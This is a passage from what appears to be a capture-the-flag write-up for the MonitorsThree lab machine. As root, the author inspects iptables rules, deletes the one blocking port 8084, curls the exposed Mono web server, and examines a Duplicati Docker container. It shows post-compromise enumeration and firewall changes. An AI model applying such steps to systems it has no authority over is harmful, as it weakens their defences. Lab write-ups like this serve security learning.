+<span class="go">Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination
+1    DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
+2    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
+3    DROP       tcp  --  anywhere             anywhere             tcp dpt:8084
+4    ACCEPT     tcp  --  localhost            anywhere             tcp dpt:8084
+
+Chain FORWARD (policy DROP)
+num  target     prot opt source               destination
+1    DOCKER-USER  all  --  anywhere             anywhere
+2    DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
+3    ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+4    DOCKER     all  --  anywhere             anywhere
+5    ACCEPT     all  --  anywhere             anywhere
+6    ACCEPT     all  --  anywhere             anywhere
+7    ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
+8    DOCKER     all  --  anywhere             anywhere
+9    ACCEPT     all  --  anywhere             anywhere
+10   ACCEPT     all  --  anywhere             anywhere
+
+Chain OUTPUT (policy ACCEPT)
+num  target     prot opt source               destination
+
+Chain DOCKER (2 references)
+num  target     prot opt source               destination
+1    ACCEPT     tcp  --  anywhere             172.18.0.2           tcp dpt:8200
+
+Chain DOCKER-ISOLATION-STAGE-1 (1 references)
+num  target     prot opt source               destination
+1    DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
+2    DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere
+3    RETURN     all  --  anywhere             anywhere
+
+Chain DOCKER-ISOLATION-STAGE-2 (2 references)
+num  target     prot opt source               destination
+1    DROP       all  --  anywhere             anywhere
+2    DROP       all  --  anywhere             anywhere
+3    RETURN     all  --  anywhere             anywhere
+
+Chain DOCKER-USER (1 references)
+num  target     prot opt source               destination
+1    RETURN     all  --  anywhere             anywhere
+</span></code></pre></div></div>
+<p>The first rule in <code class="language-plaintext highlighter-rouge">INPUT</code> blocks traffic from anywhere to anywhere if the destination port is 8084. The next three rules don’t matter, as they will never hit on anything that doesn’t match on the first one. I can show this is what’s blocking by looking at the amount of traffic the rule has handled. On a fresh boot, the <code class="language-plaintext highlighter-rouge">pkts</code> and <code class="language-plaintext highlighter-rouge">bytes</code> field for the rule are both 0:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>iptables <span class="nt">-L</span> INPUT <span class="nt">-v</span> <span class="nt">-n</span>
+<span class="go">Chain INPUT (policy ACCEPT 569 packets, 53626 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
+    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
+    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
+    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
+</span></code></pre></div></div>
+<p>After a curl attempt, this has increased:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>curl localhost:8084
+<span class="go">^C
+</span><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>iptables <span class="nt">-L</span> INPUT <span class="nt">-v</span> <span class="nt">-n</span>
+<span class="go">Chain INPUT (policy ACCEPT 717 packets, 63854 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+    7   420 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
+    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
+    0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8084
+    0     0 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:8084
+</span></code></pre></div></div>
+<p>If I take down the first rule, I’m able to hit the webserver:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>iptables <span class="nt">-D</span> INPUT 1
+<span class="gp">root@monitorsthree:~#</span><span class="w"> </span>curl localhost:8084
+<span class="go">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;head&gt;
+&lt;style type="text/css"&gt;
+</span><span class="gp">body { background-color: #</span>FFFFFF<span class="p">;</span> font-size: .75em<span class="p">;</span> font-family: Verdana, Helvetica, Sans-Serif<span class="p">;</span> margin: 0<span class="p">;</span> padding: 0<span class="p">;</span> color: <span class="c">#696969; }</span>
+<span class="gp">a:link { color: #</span>000000<span class="p">;</span> text-decoration: underline<span class="p">;</span> <span class="o">}</span>
+<span class="gp">a:visited { color: #</span>000000<span class="p">;</span> <span class="o">}</span>
+<span class="gp">a:hover { color: #</span>000000<span class="p">;</span> text-decoration: none<span class="p">;</span> <span class="o">}</span>
+<span class="gp">a:active { color: #</span>12eb87<span class="p">;</span> <span class="o">}</span>
+<span class="go">p, ul { margin-bottom: 20px; line-height: 1.6em; }
+pre { font-size: 1.2em; margin-left: 20px; margin-top: 0px; }
+</span><span class="gp">h1, h2, h3, h4, h5, h6 { font-size: 1.6em; color: #</span>000<span class="p">;</span> font-family: Arial, Helvetica, sans-serif<span class="p">;</span> <span class="o">}</span>
+<span class="go">h1 { font-weight: bold; margin-bottom: 0; margin-top: 0; padding-bottom: 0; }
+</span><span class="gp">h2 { font-size: 1em; padding: 0 0 0px 0; color: #</span>696969<span class="p">;</span> font-weight: normal<span class="p">;</span> margin-top: 0<span class="p">;</span> margin-bottom: 20px<span class="p">;</span> <span class="o">}</span>
+<span class="go">h2.exceptionMessage { white-space: pre; }
+h3 { font-size: 1.2em; }
+h4 { font-size: 1.1em; }
+h5, h6 { font-size: 1em; }
+</span><span class="gp">#</span>header <span class="o">{</span> position: relative<span class="p">;</span> margin-bottom: 0px<span class="p">;</span> color: <span class="c">#000; padding: 0; background-color: #5c87b2; height: 38px; padding-left: 10px; }</span>
+<span class="gp">#</span>header h1 <span class="o">{</span> font-weight: bold<span class="p">;</span> padding: 5px 0<span class="p">;</span> margin: 0<span class="p">;</span> color: <span class="c">#fff; border: none; line-height: 2em; font-family: Arial, Helvetica, sans-serif; font-size: 32px !important; }</span>
+<span class="gp">#</span>header-image <span class="o">{</span> float: left<span class="p">;</span> padding: 3px<span class="p">;</span> margin-left: 1px<span class="p">;</span> margin-right: 1px<span class="p">;</span> <span class="o">}</span>
+<span class="gp">#</span>header-text <span class="o">{</span> color: <span class="c">#fff; font-size: 1.4em; line-height: 38px; font-weight: bold; }</span>
+<span class="gp">#</span>main <span class="o">{</span> padding: 20px 20px 15px 20px<span class="p">;</span> background-color: <span class="c">#fff; _height: 1px; }</span>
+<span class="gp">#</span>footer <span class="o">{</span> color: <span class="c">#999; padding: 5px 0; text-align: left; line-height: normal; margin: 20px 0px 0px 0px; font-size: .9em; border-top: solid 1px #5C87B2; }</span>
+<span class="gp">#</span>footer-powered-by <span class="o">{</span> float: right<span class="p">;</span> <span class="o">}</span>
+<span class="gp">.details { font-family: monospace; border: solid 1px #</span>e8eef4<span class="p">;</span> white-space: pre<span class="p">;</span> font-size: 1.2em<span class="p">;</span> overflow: auto<span class="p">;</span> padding: 6px<span class="p">;</span> margin-top: 6px<span class="p">;</span> background-color: <span class="c">#eeeeff; color: 555555 }</span>
+<span class="go">.details-wrapped { white-space: normal }
+.details-header { margin-top: 1.5em }
+.details-header a { font-weight: bold; text-decoration: none }
+p { margin-bottom: 0.3em; margin-top: 0.1em }
+</span><span class="gp">.sourceErrorLine { color: #</span>770000<span class="p">;</span> font-weight: bold<span class="p">;</span> <span class="o">}</span>
+<span class="go">&lt;/style&gt;
+&lt;script type="text/javascript"&gt;
+        var hideElementsById = new Array ();
+        window.onload = function () {
+                if (!hideElementsById || hideElementsById.length &lt; 1)
+                        return;
+                for (index in hideElementsById)
+                        toggle (hideElementsById [index]);
+        }
+
+        function toggle (divId)
+        {
+                var e = document.getElementById (divId);
+                if (!e)
+                        return;
+                var h = document.getElementById (divId + "Hint");
+                if (e.style.display == "block" || e.style.display == "") {
+                        e.style.display = "none";
+                        if (h)
+                                h.innerHTML = " (click to show)";
+                } else {
+                        e.style.display = "block";
+                        if (h)
+                                h.innerHTML = " (click to hide)";
+                }
+        }
+&lt;/script&gt;
+&lt;title&gt;Error 400&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="page"&gt;
+&lt;div id="header"&gt;
+&lt;div id="header-text"&gt;Application Exception&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id="main"&gt;
+  &lt;h1&gt;System.ArgumentOutOfRangeException&lt;/h1&gt;
+  &lt;h2 class="exceptionMessage"&gt;startIndex cannot be larger than length of string.
+Parameter name: startIndex&lt;/h2&gt;
+  &lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; HTTP 400.Error processing request.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt; Non-web exception. Exception origin (name of application or object): mscorlib.&lt;/p&gt;
+&lt;div&gt;&lt;strong&gt;Exception stack trace:&lt;/strong&gt;&lt;/div&gt;
+&lt;div class="details"&gt;  at System.String.Substring (System.Int32 startIndex, System.Int32 length) [0x0001d] in &amp;lt;d636f104d58046fd9b195699bcb1a744&amp;gt;:0
+  at System.String.Substring (System.Int32 startIndex) [0x00008] in &amp;lt;d636f104d58046fd9b195699bcb1a744&amp;gt;:0
+  at Mono.WebServer.MonoWorkerRequest.AssertFileAccessible () [0x0003b] in &amp;lt;cb67e34e0d12485694dd7ff80bee019d&amp;gt;:0
+  at Mono.WebServer.MonoWorkerRequest.ProcessRequest () [0x0000b] in &amp;lt;cb67e34e0d12485694dd7ff80bee019d&amp;gt;:0 &lt;/div&gt;&lt;div id="footer"&gt;
+  &lt;div style="color:Black;"&gt;&lt;strong&gt;Version Information:&lt;/strong&gt; &lt;tt&gt;6.12.0.200 (tarball Tue Jul 11 21:37:50 UTC 2023)&lt;/tt&gt;; ASP.NET Version: &lt;tt&gt;4.0.30319.42000&lt;/tt&gt;&lt;/div&gt;
+  &lt;div id="footer-powered-by"&gt;Powered by &lt;a href="http://mono-project.com/"&gt;Mono&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!--
+[System.Web.HttpException]: Bad request
+
+
+[System.ArgumentOutOfRangeException]: startIndex cannot be larger than length of string.
+Parameter name: startIndex
+  at System.String.Substring (System.Int32 startIndex, System.Int32 length) [0x0001d] in &lt;d636f104d58046fd9b195699bcb1a744&gt;:0
+  at System.String.Substring (System.Int32 startIndex) [0x00008] in &lt;d636f104d58046fd9b195699bcb1a744&gt;:0
+  at Mono.WebServer.MonoWorkerRequest.AssertFileAccessible () [0x0003b] in &lt;cb67e34e0d12485694dd7ff80bee019d&gt;:0
+  at Mono.WebServer.MonoWorkerRequest.ProcessRequest () [0x0000b] in &lt;cb67e34e0d12485694dd7ff80bee019d&gt;:0
+--&gt;
+</span></code></pre></div></div>
+<p>It’s crashing, presumably because the site is not configured.</p>
+<h3 id="theory">Theory</h3>
+<p>Duplicati is an executable that runs under <code class="language-plaintext highlighter-rouge">mono</code>. On MonitorsThree, it’s running from a Docker container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>docker ps
+<span class="go">CONTAINER ID   IMAGE                                  COMMAND   CREATED        STATUS         PORTS                      NAMES
+c6f014fbbd51   lscr.io/linuxserver/duplicati:latest   "/init"   7 months ago   Up 6 minutes   127.0.0.1:8200-&gt;8200/tcp   duplicati
+</span><span class="gp">root@monitorsthree:~#</span><span class="w"> </span>docker <span class="nb">exec</span> <span class="nt">-it</span> duplicati bash
+<span class="gp">root@c6f014fbbd51:/#</span><span class="w"> </span>ps <span class="nt">-auxww</span> | <span class="nb">grep</span> <span class="nt">-i</span> duplicati
+<span class="go">root          41  0.0  0.0    216    68 ?        S    21:24   0:00 s6-supervise svc-duplicati
+root         144  0.1  0.9 149284 38684 ?        Ssl  21:24   0:00 mono Duplicati.Server.exe --webservice-interface=any --server-datafolder=/config --webservice-allowed-hostnames=*
+root         160  0.3  1.5 1109184 62876 ?       Sl   21:24   0:01 /usr/bin/mono-sgen /app/duplicati/Duplicati.Server.exe --webservice-interface=any --server-datafolder=/config --webservice-allowed-hostnames=*
+</span></code></pre></div></div>
+<p>My best guess is that the box creator originally installed Duplicati in some way that also installed and set to run <code class="language-plaintext highlighter-rouge">xsp4.exe</code>. Then later, when they decided to run from a container, they didn’t fully clean up. Very much speculation, but seems like a reasonable guess.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/01/18/htb-monitorsthree.html"></a>
+</article>
